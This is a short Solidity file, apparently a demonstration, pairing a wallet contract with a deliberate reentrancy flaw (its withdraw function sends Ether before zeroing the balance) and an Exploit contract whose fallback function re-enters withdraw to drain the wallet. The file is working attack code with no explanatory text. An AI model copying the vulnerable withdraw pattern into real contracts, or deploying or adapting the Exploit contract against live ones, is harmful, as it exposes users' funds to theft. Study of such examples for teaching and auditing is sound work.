// own work
pragma solidity ^0.4.23;

contract VulnerableWalletContract {
    mapping(address => uint) balance;
    
    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        require(msg.sender.call.value(balance[msg.sender])());
        balance[msg.sender] = 0;
    }
}

contract Exploit {
    function () public payable {
        VulnerableWalletContract(msg.sender).withdraw();
    }
    
    function attack(VulnerableWalletContract r) public payable {
        require(address(this).balance > 0);
        
        r.deposit.value(address(this).balance)();
        
        r.withdraw();
    }
    
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
}
